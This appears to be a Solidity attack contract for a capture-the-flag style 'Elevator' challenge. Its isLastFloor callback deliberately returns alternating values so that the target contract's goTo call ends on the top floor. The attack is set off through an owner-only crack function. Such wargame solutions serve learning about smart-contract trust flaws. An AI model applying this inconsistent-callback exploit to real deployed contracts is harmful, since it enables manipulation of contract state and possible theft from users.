// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

// Uncomment this line to use console.log
import "hardhat/console.sol";

interface ElevatorI {
    function goTo(uint256 _floor) external;
}

contract Elevator {
    address payable public owner;
    ElevatorI targetContractI;
    bool firstCall = false;
    uint256 public constant MAX_UINT256 = type(uint256).max;

    constructor(address targetContract) payable {
        owner = payable(msg.sender);
        targetContractI = ElevatorI(targetContract);
    }

    function crack() public {
        require(msg.sender == owner, "You aren't the owner");
        console.log("Aca");
        targetContractI.goTo(MAX_UINT256);
    }

    function isLastFloor(uint256) external returns (bool) {
        bool res = firstCall;
        firstCall = !firstCall;
        return res;
    }
}
